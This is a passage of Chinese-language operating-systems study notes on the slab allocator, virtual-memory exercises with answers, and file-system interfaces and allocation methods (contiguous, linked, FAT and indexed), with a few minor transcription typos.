它<br>们分别位于各自的 cache 上。</p><p><img src="/posts/8ce3e425/image-20220103195716302.png" alt="image-20220103195716302"></p><p>slab分配器有两个主要优点：</p><p>①没有因碎片而引起的内存浪费。 碎片不是问题， 这是因为每个内核数据结构都有相应的cache， 而每个cache 都由若干slab组成， 而每个slab又分为若干个与对象大小相  同的部分。 因此， 当内核请求对象内存时， slab 分配器可以返回刚好可以表示对象所需的内存。</p><p>②内存请求可以快速满足。slab 分配器对于需要经常不断分配内存、释放内存来说特别有效， 而操作系统经常这样做。 内存分配与释放可能费时。 然而， 由于对象预先创建，所以可从 cache 上快速分配。另外，当用完对象并释放时，只需要标记为空闲并 返回给 cache,以便下次再用。</p><h2 id="99-其他考虑"><a class="markdownIt-Anchor" href="#99-其他考虑"></a> 9.9 其他考虑</h2><h3 id="991-预调页"><a class="markdownIt-Anchor" href="#991-预调页"></a> 9.9.1 预调页</h3><h3 id="992-页大小"><a class="markdownIt-Anchor" href="#992-页大小"></a> 9.9.2 页大小</h3><h3 id="993-tlb范围"><a class="markdownIt-Anchor" href="#993-tlb范围"></a> 9.9.3 TLB范围</h3><h3 id="994-反向页表"><a class="markdownIt-Anchor" href="#994-反向页表"></a> 9.9.4 反向页表</h3><h3 id="995-程序结构"><a class="markdownIt-Anchor" href="#995-程序结构"></a> 9.9.5 程序结构</h3><h3 id="996-io互锁"><a class="markdownIt-Anchor" href="#996-io互锁"></a> 9.9.6 I/O互锁</h3><h2 id="910-操作系统实例"><a class="markdownIt-Anchor" href="#910-操作系统实例"></a> 9.10 操作系统实例</h2><h3 id="9101-windows-xp"><a class="markdownIt-Anchor" href="#9101-windows-xp"></a> 9.10.1 Windows XP</h3><h3 id="9102-solaris"><a class="markdownIt-Anchor" href="#9102-solaris"></a> 9.10.2 Solaris</h3><h2 id="911-习题"><a class="markdownIt-Anchor" href="#911-习题"></a> 9.11 习题</h2><blockquote><p>9.2 讨论按需调页所需的硬件支持。</p></blockquote><p>页表、TLB、次级存储器</p><blockquote><p>9.3 什么是写时复制？何时这种特点有效？实现这种特点需要什么硬件支持？</p></blockquote><p><strong>写时复制</strong>（copy-on-write ）允许父进程与子进程开始时共享同一页面。 这些页面标记为写时复制页， 即如果任何一个进程需要对页进行写操作，那么就创建一个共享页的副本。以允许两个程序分别访问不同的副本，而不会相互干扰。</p><p>实现所需的<strong>硬件支持</strong>简单如下：在每次内存访问时，需要查阅页表以检查页是否具有写保护。如果它确实是写保护的，则会出现陷阱，操作系统可以解决此问题</p><blockquote><p>9.4 某台计算机给它的用户提供了2<sup>32</sup> B 的虚拟地址空间。计算机有2<sup>18</sup>B 的物理内存。虚拟内存使用页面大小为 4096B的分页机制实现。一个用户进程产生虚拟地址 11123456，现在说明一下系统怎样建立相应的物理地址。 区分一下软件操作和硬件操作。</p></blockquote><blockquote><p>9.5 假设有一个按需调页存储器， 页表放在寄存器中。 处理一个页错误， 当有空的帧可用或被置换的帧没有被修改过时要用8 ms， 当被置换的帧被修改过时用20ms。存储器存取时间为lOOns。假设被置换的页中有70%被修改过， 有效存取时间不超过200ns 时最大可以接受的页错误率是多少？</p></blockquote><p><img src="/posts/8ce3e425/image-20220112085440155.png" alt="image-20220112085440155"></p><blockquote><p>9.6 假定要监视时钟算法的指针移动速度（可用来表示页替换的速度）。 根据下面现象， 可得到什么结论？<br>a. 指针移动快<br>b. 指针移动慢</p></blockquote><p>如果指针移动得很快，那么程序会同时访问大量页面。最有可能的是，在与页面对应的位被清除和再次检查之间的时间段内，页面被再次访问，因此无法被替换。这会导致在找到受害者页面之前对页面进行更多扫描。如果指针移动缓慢，那么虚拟内存系统将极其高效地查找替换的候选页，这表明许多驻留页没有被访问</p><blockquote><p>9.7 讨论在何种情况下最少经常使用页替换算法要比最近最少使用页置换算法要好。 并讨论相反情况。</p></blockquote><p>偶发性的、周期性的批量查询操作（包含冷数据）会淘汰掉大量的热点数据，导致 LRU 命中率急剧下降，缓存污染情况比较严重。这种情况下LFU算法更优。</p><p>相反情况：一个页在进程开始时使用很多， 但以后就不再使用。 由于其使用过很多， 所以它有较大次数， LFU不会将其替换，所以即使不再使用仍然会在内存中。这种情况下比LRU差。</p><p>举例：</p><p>考虑下面的页串：1 1 2 3 4 5 1，内存可容纳4页，当访问5时，LFU算法将会替换除了1以外的任意一页，这样接下来访问1时，可以不用替换。</p><p>相反情况，如果考虑下面的页串： 1 2 3 4 5 2，LRU算法的性能更好。</p><blockquote><p>9.8 讨论在何种情况下最多经常使用页置换算法要比最少近来使用算法要好。 并讨论相反情况。</p></blockquote><p>MFU基于以下原理具有最小次数的页可能刚刚调进来， 且还没有使用。</p><p>考虑可容纳 4 页的内存 1 2 3 4 4 4 5 1 ,MFU 算法会用 5 替换 4 ， 而 LRU 则用5替换1，这种情况LRU更优。</p><p>在实践中很少使用MFU</p><blockquote><p>9.9 VAXNMS 系统采用 FIFO 置换算法来处理常驻页和经常使用页的空闲帧池。 假定空闲帧池采用最近最少使用置换算法。 试回答下列问题：<br>a如果出现页错误而所需页不在空闲帧池中， 那么新请求页如何从空闲中分配？<br>b.如果出现页错误且所需页在空闲帧池中，那么新请求页如何由常驻页和经常使用页的空闲池<br>来满足？<br>c.如果常驻页的数量为l， 那么这样方法会退化成什么？<br>d.如果空闲帧池的页数量为0 ， 那么这样方法会退化成什么？</p></blockquote><blockquote><p>9.10 假设一个具有下面时间利用率的按需调页系统：</p><p>CPU利用率   20%<br>分页磁盘    97.7%<br>其他IO设备   5%</p><p>试说明下面哪一项可能提高CPU的利用率， 为什么？<br>a.安装一个更快的CPU<br>b.安装一个更大的分页磁盘<br>c.提高多道程序的程度<br>d.降低多道程序的程度<br>e.安装更多内存<br>f.安装个更快的硬盘， 或对多个硬盘用多个控制器<br>g.加入预约式页面调度算法预取页<br>h.增加页面大小</p></blockquote><p>abc不行</p><p>其他可以</p><p>h可能加可能减</p><blockquote><p>一个页置换算法应使发生页面错误的次数最小化。 可以通过将使用频率高的页平均分配到整个内存， 而不是只使用少数几个帧来达到这种最小化。 可以对每个帧设置一个计数器来记录与帧相关的页数。 那么当置换一个页时就可以查找页数最少的帧来置换。</p><p>a. 基于这个基本思想定义一个页置换算法。 特别注意的问题：</p><p>①计数器初始化值是多少？</p><p>②什么时候计数增加？</p><p>③什么时候计数减少？</p><p>④怎样选择被置换的页？</p><p>b. 设有 4 个帧， 对于下面的页引用序列， 你的算法会发生多少次页错误？</p><p>1,2,3,4,5,3,4, 1,6,7,8, 7, 8,9,7,8,9, 5, 4, 5, 4, 2<br>c. 最优页置换算法对于 4 帧的 b 中的页引用序列最小页错误数为多少？</p></blockquote><p>a.定义一 个页面置换算法解决 问题 ：</p><p>①计数器初始值——0 ;</p><p>②计数器值增加——每当新的一页与此帧相关联 ；</p><p>③计数器值减少——每当与此帧相关联的一个页不再需要 ；</p><p>④怎样选择要被置换的页一一找到带有最小计数器值的帧。使用先进先出算法解除其关系</p><p>b. 14个页错误</p><p>c. 11个页错误</p><blockquote><p>9.14 假设一个请求调页系统具有一个平均访问和传输时间为 20ms 的分页磁盘。 地址转换是通过在主存中的页表来进行的， 每次内存访问时间为1闷。 这样， 每个通过页表进行的内存访问都要访问内存两次。 为了提高性能， 加入一个相关存储器， 当页表项在相关存储器中时， 可以减少对内存的访问次数。 假设 80%的访问发生在相关存储器中， 而且剩下中的 10%（或总的 2%） 会导致页错误。内存的有效访问时间是多少？</p></blockquote><blockquote><p>！！！9.15 颠簸的原因是什么？系统怎样检测颠簸？－旦系统检测到颠簸， 系统怎样来消除这个问题？</p></blockquote><p>分配的页数少于进程所需的最小页数时发生颠簸，并迫使它不断地发生页错误。</p><p>该系统可通过对比多道程序的程度和CPU利用率的程度，以此来检测颠簸。<br>降低多道程序的程度可以消除颠簸。</p><blockquote><p>9.16 一个进程是否可有两个工作集合， 一个用于数据， 另一用于代码？试解释之。</p></blockquote><blockquote><p>9.17 在工作集合模型中， 参数A 用来定义工作集合窗口的大小。当为A 设置一个小值时， 对页错误频率及正在系统中执行进程的数量有何影响？当为A设置一个大值时， 又如何？</p></blockquote><blockquote><p>9.20 假设有一个系统允许为进程分配不同大小的页。这样的请求页系统有什么优点？如何修改虚拟内存系统以提供这种功能？</p></blockquote><h1 id="第10章-文件系统接口"><a class="markdownIt-Anchor" href="#第10章-文件系统接口"></a> 第10章 文件系统接口</h1><h2 id="101-文件概念"><a class="markdownIt-Anchor" href="#101-文件概念"></a> 10.1 文件概念</h2><p>从用户角度而言，文件是逻辑外存的最小分配单元 ，即数据除非在文件中，否则不能写到外存。 通常， 文件表示程序（源形式和目标形式）和数据。</p><h3 id="1011-文件属性"><a class="markdownIt-Anchor" href="#1011-文件属性"></a> 10.1.1 文件属性</h3><p>文件有一定的属性， 这根据系统而有所不同， 但是通常都包括如下属性：</p><ul><li>名称：文件符号名称是唯一的、 按照人们容易读取的形式 保存。</li><li>标识符：标识文件系统内文件的 唯一标签， 通常为数字；对人而言这是不可读的文件名称。</li><li>类型：被支持不同类型的文件系统所使用。</li><li>位置： 该信息为指向设备和设备上文件位置的指针。</li><li>大小：文件当前大小（以字节、字或块来统计〉，该属性也可包括文件允许的最大容量值。</li><li>保护： 决定谁能读、写、 执行等的访问控制信息。</li><li>时间、 日期和用户标识：文件创建、 上次修改和上次访问的相关信息。 这些数据用于保护、 安全和使用跟踪。</li></ul><h3 id="1012-文件操作"><a class="markdownIt-Anchor" href="#1012-文件操作"></a> 10.1.2 文件操作</h3><p><strong>基本文件操作：</strong></p><ul><li><p><strong>创建文件</strong>：创建文件有两个必要步骤。第一，必须在文件系统中为文件找到空间。在第11章中将会讨论如何为 文件分配空间。 第二，在目录中为 新文件创建一个条目。</p></li><li><p><strong>写文件</strong>： 为了写文件，执行一个系统调用，其指明文件名称和要写入文件的内容。对于给定的文件名称，系统会搜索目录以查找该文件位置。 系统必须为该文件维护一个军位置的指针。每当发生写操作时，必须更新写指针。</p></li><li><p><strong>读文件</strong>： 为了读文件，使用一个系统调用，并指明文件名称和要读入文件块的内存位置。 同样，需要搜索目录以找到相关目录项，系统要为该文件维护一个读位置的指针。每当发生读操作时，必须更新尉旨针。 一个进程通常只对一个文件读或写，所以当前操作位置可作为每个进程当前文件位置指针。由于 读和写操作都使用同一指针，这既节省了空间也降低系统复杂度。</p></li><li><p><strong>在文件内重定位</strong>： 搜索目录相应条目，设置当前文件位置指针为给定值。 在文件内重定位不需要包含真正的 I/0。该文件操作也称为主佯罩在世（seek）。</p></li><li><p><strong>删除文件</strong>： 为了删除文件，在目录中搜索给定名称的文件。 找到相关目录条目后，释放所有的文件空间以便其他文件使用，并删除相应目录条目。</p></li><li><p><strong>截短文件</strong>： 用户可能只需要删除文件内容而保留其属性，而不是强制删除文件再创建文件。该函数将不改变所有文件属性，而只是将其长度设为0并释放其空间。</p></li></ul><h3 id="1013-文件类型"><a class="markdownIt-Anchor" href="#1013-文件类型"></a> 10.1.3 文件类型</h3><p><img src="/posts/8ce3e425/image-20220108122633760.png" alt="image-20220108122633760"></p><h3 id="1014-文件结构"><a class="markdownIt-Anchor" href="#1014-文件结构"></a> 10.1.4 文件结构</h3><h3 id="1015-内部文件结构"><a class="markdownIt-Anchor" href="#1015-内部文件结构"></a> 10.1.5 内部文件结构</h3><h2 id="102-访问方法"><a class="markdownIt-Anchor" href="#102-访问方法"></a> 10.2 访问方法</h2><h3 id="1021-顺序访问"><a class="markdownIt-Anchor" href="#1021-顺序访问"></a> 10.2.1 顺序访问</h3><p>最为简单的访问方式是<strong>顺序访问</strong>。 文件信息按顺序， 一个记录接着一个记录地加以处理。 这种访问模式最为常用， 例如， 编辑器和编译器通常按这种方式访问文件。</p><p>大量的文件操作是读和写。 读操作读取下 一文件部分，并自动前移文件指针，以跟踪I/O位置。类似地， 写操作会向文件尾部增加内容，相应的文件指针移到新增数据之后（ 新文件结尾）。 文件也可重新设置到开始位置， 有的系统允许向前或向后跳过n个（这里n为整数， 有时只能为I)记录。 顺序访问如图 10.3 所示。 顺序访问基于文件的磁带模型，不仅适用于顺序访问设备， 也适用于随机访问设备。</p><p><img src="/posts/8ce3e425/image-20220108123600713.png" alt="image-20220108123600713"></p><h3 id="1022-直接访问"><a class="markdownIt-Anchor" href="#1022-直接访问"></a> 10.2.2 直接访问</h3><p>另一方式是<strong>直接访问</strong> （或相对访问〉。 文件由固定长度的逻辑记录组成， 以允许程序按任意顺序进行快速读和写。 直接访问方式是基于文件的磁盘模型， 这是因为磁盘允许对任意文件块进行随机读和写。 对直接访问， 文件可作为块或记录的编号序列。 因此， 可先读取块14， 再读块53， 最后再写块7。 对于直接访问文件， 读写顺序是没有限制的。</p><p>由用户向操作系统所提供的块号通常为<strong>相对块号</strong>。 相对块号是相对于文件开始的索引。</p><h3 id="1023-其他访问方式"><a class="markdownIt-Anchor" href="#1023-其他访问方式"></a> 10.2.3 其他访问方式</h3><p>其他访问方式可建立在直接访问方式之上。 这些访问通常涉及创建文件索引。 索引包括各块的指针。 为了查找文件中的记录， 首先搜索索引， 再根据指针直接访问文件， 以查找所需要的记录。</p><p><img src="/posts/8ce3e425/image-20220108124050544.png" alt="image-20220108124050544"></p><h2 id="103-目录结构"><a class="markdownIt-Anchor" href="#103-目录结构"></a> 10.3 目录结构</h2><h3 id="1031-存储结构"><a class="markdownIt-Anchor" href="#1031-存储结构"></a> 10.3.1 存储结构</h3><p>有时需要在一个磁盘上装多种文件系统， 或一部分用于文件系统而另 一部分用于其他地方， 如交换空间或非格式化的磁盘空间。 这些部分称为<strong>分区</strong>或片， 或称为小型磁盘（IBM的说法）。</p><p>将存储文件系统的一大块存储空间作为<strong>卷</strong>。 卷可以存放多个操作系统， 使系统启动和运行多个操作系统。</p><p><img src="/posts/8ce3e425/image-20220108124227507.png" alt="image-20220108124227507"></p><h3 id="1032-目录概述"><a class="markdownIt-Anchor" href="#1032-目录概述"></a> 10.3.2 目录概述</h3><p><strong>目录相关操作：</strong></p><ul><li>**搜索文件：**需要能够搜索目录结构以查找特定文件的条目。因为文件具有符号名称，且类似的名称可能表示文件之间的关系， 所以要能查找文件名和某个模式相匹配的所有文件。</li><li><strong>创建文件：</strong> 可以创建新文件并增加到目录中。</li><li><strong>删除文件：</strong> 当不再需要文件时， 可以从目录中删除它。</li><li><strong>遍历目录：</strong> 需要能遍历目录内的所有文件以及其目录中每个文件条目的内容。</li><li><strong>重命名文件：</strong> 因为文件名称可向用户表示其内容， 当文件内容和用途改变时名称必须改变。 重新命名文件也允许改变该文件在目录结构中的位置。</li><li><strong>跟踪文件系统：</strong> 用户可能希望访问每个目录和每个目录的每个文件。 为了可靠， 定期备份整个文件系统的内容和结构是个不错的方法。 这种备份通常将所有文件复制到磁带上。 这种技术提供了备份副本以防止系统出错。 除此之外， 当文件不再使用时候， 这个文件被复制到磁带上， 该文件的原来占用磁盘空间可以释放以供其他文件所用。</li></ul><h3 id="1033-单层结构目录"><a class="markdownIt-Anchor" href="#1033-单层结构目录"></a> 10.3.3 单层结构目录</h3><p>最简单的目录结构是单层结构目录。 所有文件都包含在同一目录中， 其特点是便于理解和支持。</p><p><img src="/posts/8ce3e425/image-20220108125045812.png" alt="image-20220108125045812"></p><h3 id="1034-双层结构目录"><a class="markdownIt-Anchor" href="#1034-双层结构目录"></a> 10.3.4 双层结构目录</h3><p>对于<strong>双层结构目录</strong>的结构， 每个用户都有自己的用户文件目录（ user file directory,UFD）。 每个UFD 都有相似的结构， 但只列出了单个用户的文件。 当一个用户作业开始执行或一个用户注册时， 就搜索系统的主文件目录（ master file directory, MFD）。 通过用户名或账号可索引MFD， 每个条目指向用户的UFD（见图10.8）。</p><p><img src="/posts/8ce3e425/image-20220108125126077.png" alt="image-20220108125126077"></p><p>虽然双层结构目录解决了名称冲突问题， 但是它仍有缺点。 这种结构有效地对用户加以隔离。 这种隔离在用户需要完全独立时是优点， 但是在用户需要在某个任务上进行合作和访问其他文件时却是个缺点。 有的系统简单地不允许本地用户文件被其他用户所访问。</p><h3 id="1035-树状结构目录"><a class="markdownIt-Anchor" href="#1035-树状结构目录"></a> 10.3.5 树状结构目录</h3><p>将两层目录结构扩展为任意高度的树，这种推广允许用户创建自己的子目录，相应地组织文件。事实上，树是最为常用的目录结构。树有根目录，系统内的每个文件都有唯一路径名。</p><p><img src="/posts/8ce3e425/image-20220108125717434.png" alt="image-20220108125717434"></p><h3 id="1036-无环图目录"><a class="markdownIt-Anchor" href="#1036-无环图目录"></a> 10.3.6 无环图目录</h3><p>树状结构禁止共享文件和目录。 <strong>无环图</strong>（acyclic graph）允许目录含有共享子目录和文件（见图10.10）。 用一文件或子目录可出现在两个不同目录中。 无环图是树状结构目录方案的扩展。</p><p><img src="/posts/8ce3e425/image-20220108130216854.png" alt="image-20220108130216854"></p><h3 id="1037-通用图目录"><a class="markdownIt-Anchor" href="#1037-通用图目录"></a> 10.3.7 通用图目录</h3><p>当对己存在的树状结构目录增加链接时， 树状结构就被破坏了， 产生了简单的图结构  。</p><p><img src="/posts/8ce3e425/image-20220108130627493.png" alt="image-20220108130627493"></p><h2 id="104-文件系统安装"><a class="markdownIt-Anchor" href="#104-文件系统安装"></a> 10.4 文件系统安装</h2><p>如同文件使用前必须要扩开，文件系统在被系统上的进程使用之前必须安装（ mount）。具体地说， 目录结构可以建立在多个卷上， 这些卷必须被安装以使它们在文件系统命名空间中可用。</p><p><img src="/posts/8ce3e425/image-20220108131017823.png" alt="image-20220108131017823"></p><h2 id="105-文件共享"><a class="markdownIt-Anchor" href="#105-文件共享"></a> 10.5 文件共享</h2><h3 id="1051-多用户"><a class="markdownIt-Anchor" href="#1051-多用户"></a> 10.5.1 多用户</h3><h3 id="1052-远程文件系统"><a class="markdownIt-Anchor" href="#1052-远程文件系统"></a> 10.5.2 远程文件系统</h3><h3 id="1053-一致性语义"><a class="markdownIt-Anchor" href="#1053-一致性语义"></a> 10.5.3 一致性语义</h3><h2 id="106-保护"><a class="markdownIt-Anchor" href="#106-保护"></a> 10.6 保护</h2><h3 id="1061-访回类型"><a class="markdownIt-Anchor" href="#1061-访回类型"></a> 10.6.1 访回类型</h3><h3 id="1062-访问控制"><a class="markdownIt-Anchor" href="#1062-访问控制"></a> 10.6.2 访问控制</h3><h3 id="1063-其他保护方式"><a class="markdownIt-Anchor" href="#1063-其他保护方式"></a> 10.6.3 其他保护方式</h3><h2 id="107-小结"><a class="markdownIt-Anchor" href="#107-小结"></a> 10.7 小结</h2><h2 id="习题"><a class="markdownIt-Anchor" href="#习题"></a> 习题</h2><h1 id="第11章-文件系统实现"><a class="markdownIt-Anchor" href="#第11章-文件系统实现"></a> 第11章 文件系统实现</h1><h2 id="111-文件系统结构"><a class="markdownIt-Anchor" href="#111-文件系统结构"></a> 11.1 文件系统结构</h2><p>磁盘提供大量的外存空间来维持文件系统。<strong>磁盘</strong>的下述两个<strong>特点</strong>，使其成为存储多个文件的方便介质：</p><ul><li><p>①可以原地重写，可以从磁盘上读一块，修改该块，并将它写回到原来的位置。</p></li><li><p>②可以直接访问磁盘上的任意一块信息。因此，可以方便地按顺序或随机地访问文件，从一个文件切换到另 一个文件只需要简单地移动读写磁头并等待磁盘转动即可以完成。</p></li></ul><p><img src="/posts/8ce3e425/image-20220108133306308.png" alt="image-20220108133306308"></p><p>设计中的每层利用较低层的功能创建新的功能来为更高层服务。</p><p><strong>I/O控制</strong>为最底层， 由设备驱动程序和中断处理程序组成， 实现内存与 磁盘之间的信息传输。 设备驱动程序可以作为翻译器。 其输入由高层命令组成， 如 “ retrieve block 123”  。其输出由底层的 、硬件特定的命令组成， 这些命令用于控制硬件控制器， 通过硬件控制器可以使VO 设备与系统其他部分相连。</p><p><strong>基本文件系统</strong>只需要向合适的设备驱动程序发送一般命令就可对磁盘上的物理块进行读写。每个块由其数值磁盘地址来标识（例如，驱动器1，柱面（ cylinder) 73，磁道（ track)3， 扇区（sector) 10）。</p><p><strong>文件组织模块</strong>知道文件及其逻辑块和物理块。 由于知道所使用的文件分配类型和文件的位置， 文件组织模块可以将逻辑块地址转换成基本文件系统所用的物理块地址。 每个文件的逻辑块按从0 或1到N来编号， 而包含数据的物理块并不与逻辑号匹配， 因此需要通过翻译来定位块。 文件组织模块也包括空闲空间 管理器， 用来跟踪未分配的块并根据要求提供给文件组织模块。</p><p><strong>逻辑文件系统</strong>管理元数据。元数据包括文件系统的所有结构数据， 而不包括实际数据（或文件内容）。逻辑文件系统根据给定符号文件名来 管理目录结构，并提供给文件组织模块所需要的信息。逻辑文件系统通过文件控制块来维护文件结构。文件控制块（file control block, FCB） 包含文件的信息， 如拥有者、权限、文件内容的位置。 逻辑文件系统也负责保护和安全（参见第10章和第14章）。</p><p>UNIX使用UNIX文件系统（<strong>UFS</strong>），它是基于伯克利快速文件系统（FFS） 的。</p><p>WindowsNT、Windows2000、WindowsXP支持 磁盘文件系统 <strong>FAT</strong>、<strong>FAT32</strong>和<strong>NTFS</strong></p><h2 id="112-文件系统实现"><a class="markdownIt-Anchor" href="#112-文件系统实现"></a> 11.2 文件系统实现</h2><h3 id="1121-概述"><a class="markdownIt-Anchor" href="#1121-概述"></a> 11.2.1 概述</h3><p><strong>磁盘结构</strong></p><p>在磁盘上，文件系统可能包括如下信息：</p><ul><li>如何启动所存储的操作系统</li><li>总的块数</li><li>空闲块的数目和位置</li><li>目录结构以及各个具体文件等</li></ul><p>磁盘结构包括</p><ul><li><strong>引导控制块</strong>（boot control block）：通常为分区的第一块。如果该分区没有OS，则为空。（其他名称：引导块（Linux）、分区引导扇区（WindowsNT））</li><li><strong>分区控制块</strong>（partition control block）：包括分区详细信息，如分区的块数、块的大小、空闲块的数量和指针、空闲FCB的数量和指针等（亦称为超级块（Linux）、主控文件表（WindowsNT））</li><li>**目录结构：**用来组织文件</li><li>**文件控制块（FCB）：**包括很多文件信息，如文件许可、拥有者、大小和数据块的位置等</li></ul><p><strong>内存中与文件相关的结构</strong></p><ul><li><p>内存分区表：包含所有安装分区的信息</p></li><li><p>内存目录结构：保存近来访问过的目录信息（对安装分区的目录，可以包括一个指向分区表的指针）</p></li><li><p>系统范围的打开文件表：包括每个打开文件的FCB拷贝和其他信息</p></li><li><p>单个进程的打开文件表：包括一个指向系统范围内已打开文件表中合适条目和其他信息的指针</p><ul><li><p>文件描述符（file descriptor, Linux/UNIX）</p><p>文件描述符在形式上是一个非负整数。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。文件进程控制块中都有一份文件描述符表（可以把它看成是一个数组，里面的元素是指向file结构体指针类型），这个数组的下标就是文件描述符。文件描述符是Linux/unix下的概念</p></li><li><p>文件句柄（file handle, Windows）</p><p>Windows下的概念。句柄是Windows下各种对象的标识符。文件句柄和文件描述符类似，它也是一个非负整数，也用于定位文件数据在内存中的位置。</p></li></ul></li></ul><h3 id="1122-分区与安装"><a class="markdownIt-Anchor" href="#1122-分区与安装"></a> 11.2.2 分区与安装</h3><h3 id="1123-虚拟文件系统"><a class="markdownIt-Anchor" href="#1123-虚拟文件系统"></a> 11.2.3 虚拟文件系统</h3><p>虚拟文件系统(VFS)提供了一种面向对象的方法来实现文件系统</p><p>VFS允许在不同类型的文件系统上采用同样的系统调用接口（API）</p><ul><li>API是针对VFS的接口，而非对任何特定类型的文件系统</li></ul><p>虚拟文件系统实现的目标是：</p><ul><li>同时支持多种文件系统，系统中安装多个文件系统时，对用户而言没有区别，他们都表现为一致的接口。</li></ul><h2 id="113-目录实现"><a class="markdownIt-Anchor" href="#113-目录实现"></a> 11.3 目录实现</h2><h3 id="1131-线性列表"><a class="markdownIt-Anchor" href="#1131-线性列表"></a> 11.3.1 线性列表</h3><p>最为简单的目录实现方法是使用存储文件名和数据块指针的线性列表。</p><p>这种方法编程简单但运行时较为费时。</p><p>要创建新文件，必须首先搜索目录以确定没有同样名称的文件存在。接着，在目录后增加一个新条目。要删除文件时，根据给定文件名搜索目录，接着释放分配给它的空间。</p><h3 id="1132-哈希表"><a class="markdownIt-Anchor" href="#1132-哈希表"></a> 11.3.2 哈希表</h3><p>用于文件目录的另一个数据结构是哈希表。采用这种方法时，除了使用线性列表存储目录条目外， 还使用了哈希数据结构。 哈希表根据文件名得到一个值， 井返回一个指向线性列表中元素的指针。</p><p>因此， 它大大地减少目录搜索时间。 插入和删除也较简单， 不过需要一些预备措施来避免冲突（collision) （两个文件名哈希到相同的位置〉。</p><h2 id="114-分配方法"><a class="markdownIt-Anchor" href="#114-分配方法"></a> 11.4 分配方法</h2><p>常用的主要磁盘空间分配方法有三个： 连续、链接和索引。每种方法都有其优点和缺点。</p><h3 id="1141-连续分配"><a class="markdownIt-Anchor" href="#1141-连续分配"></a> 11.4.1 连续分配</h3><p><strong>连续分配</strong>（contiguous allocation） 方法要求每个文件在磁盘上占有一组连续的块。</p><p>文件的连续分配可以用第一块的磁盘地址和连续块的数量来定义。 如果文件有n块长并从位置b开始， 那么该文件将占有块b,b+I,b+2 …，b+n一 1。 一个文件的目录条目包括开始块的地址和该文件所分配区域的长度， 参见图11.5。</p><p><img src="/posts/8ce3e425/image-20220108140304356.png" alt="image-20220108140304356"></p><p><strong>优点：</strong></p><ul><li>采用这种序列，假设只有一个作业访问磁盘，在访问块b后访问块b+1通常不需要移动磁头。当需要磁头移动（从一个柱面的最后扇区到下 一个柱面的第一扇区），只需要移动一个磁道。因此，用于访问连续分配文件所需要的寻道数最小，在确实需要寻道时所需要的寻道时间也最小。</li><li>连续分配支持顺序访问和直接访问</li><li>简单 － 只需要记录文件的起始位置（块号）及长度。</li></ul><p><strong>缺点：</strong></p><ul><li>为新文件找到空间比较困难。 有外部碎片（external fragmentation）问题。</li><li>连续分配的另一个问题是确定一个文件需要多少空间。</li></ul><h3 id="1142-链接分配"><a class="markdownIt-Anchor" href="#1142-链接分配"></a> 11.4.2 链接分配</h3><p><strong>链接分配</strong>（linked allocation） 解决了连续分配的所有问题。 采用链接分配， 每个文件是磁盘块的链表： 磁盘块分布在磁盘的任何地方。 目录包括文件第一块的指针和最后一块的指针。 例如， 一个有 5 块的文件可能从块 9 开始，然而是块 16、 块 1 、 块 10，最后是块25 （见图 11.6）。每块都有一个指向下一块的指针。用户不能使用这些指针。因此，如果每块有 512B， 磁盘地址为 4B， 那么用户可以使用 508B。</p><p><img src="/posts/8ce3e425/image-20220108140920356.png" alt="image-20220108140920356"></p><p><strong>优点：</strong></p><ul><li>采用链接分配没有外部碎片，空闲空间列表上的任何块可以用来满足请求。</li><li>文件创建与增长容易，当创建文件时，并不需要说明文件大小。 只要有空闲块，文件就可以增大。 因此，无需合并磁盘空间。</li></ul><p><strong>缺点：</strong></p><ul><li>主要问题是它只能有效地用于文件的顺序访问。 要找到文件的第i块，必须从文件的开始起，跟着指针，找到第i块。 对指针的每次访问都需要读磁盘，有时需要进行磁盘寻道。 因此，链接分配不能有效地支持文件的直接访问。</li><li>链接分配的另一缺点是指针需要空间。如果指针需要使用 512B 块中的4B，那么0.78%的磁盘空间将会用于指针，而不是其他信息。 因而，每个文件也需要比原来更多的空间。</li><li>链接分配存在可靠性问题。会有指针损坏或丢失问题。</li></ul><p>一 个采用 链接分配方法的变种是**文件分配表（FAT）**的使用 。 这一简单但有效的磁盘空间分配用于MS-DOS和OS/2操作系统。</p><p>FAT的使用与链表相似。 目录条目含有文件首块的块号码。根据块号码索引的FAT条目包含 文件下一块的块号码。 这条链会一直继续到最后一块，该块对应FAT条目的值为文件结束值。未使用的块用0值来表示。</p><p><img src="/posts/8ce3e425/image-20220108141639269.png" alt="image-20220108141639269"></p><h3 id="1143-索引分配"><a class="markdownIt-Anchor" href="#1143-索引分配"></a> 11.4.3 索引分配</h3><p><strong>索引分配</strong>（indexed allocation）通过把所有指针放在一起， 即通过索引块解决了这个问题。</p><p>当创建文件时， 索引块的所有指针都设为 null。 当首次写入第i块时， 先从空闲空间管理器中得到一块， 再将其地址写到索引块的第i个条目。</p><p><img src="/posts/8ce3e425/image-20220108151724583.png" alt="image-20220108151724583"></p><p><strong>优点：</strong></p><ul><li>索引分配支持直接访问， 且没有外部碎片问题， 这是因为磁盘上的任一块都可满足更多空间的要求。</li><li>保持了链接结构的优点，又解决了其缺点：</li><li>即能顺序存取，又能随机存取</li><li>满足了文件动态增长、插入删除的要求</li><li>能充分利用外存空间</li></ul><p><strong>缺点：</strong></p><ul><li>索引分配会浪费空间。索引块指针的开销通常要比链接分配指针的开销大。设想一下在一般情况下， 每个文件只有一块或两块长。 采用链接分配， 每块只浪费一个指针。 采用索引分配， 尽管只有一个或两个指针为非空， 也必须分配一个完整的索引块。</li><li>索引分配方案与链接分配一样在性能方面有所欠缺。 特别是， 虽然索引块可以缓存在内存中，但是数据块可能分布在整个分区上。</li></ul><p><strong>确定索引块大小的机制：</strong></p><ul><li>链接方案：一个索引块通常为一个磁盘块。 因此， 它本身能直接读写。 为了处理大文件， 可以将多个索引块链接起来。 例如， 一个索引块可以包括一个含有文件名的头部和一组头100个磁盘块的地址。 下一个地址（索引块的最后一个词）为 nil （对于小文件〉或指向另 一个索引块（大文件）。</li><li>多层索引：链接表示的一种变种是用第一层索引块指向一组第二层的索引块， 第二层索引块再指向文件块。 为了访问一块， 操作系统通过第一层索引查找第二层索引， 再用第二层索引查找所需的数据块。 这种方法根据最大文件大小的要求， 可以继续到第三或第四层。 对于有 4 096 B 的块， 可以在索引块中存入 1 024 个4B的指针。 两层索引允许1048576个数据块， 这允许最大文件为 4GB。</li><li>组合方案：在 UFS 中使用的另 一方案是将索引块的头 15 个指针存在文件的 inode中。 这其中的头 12 个指针指向直接块：即它们包括了能存储文件数据的块的地址。 因此，（不超过 12 块的〉小文件不需要其他的索引块。 如果块大小为 4 KB ， 那么不超过 48 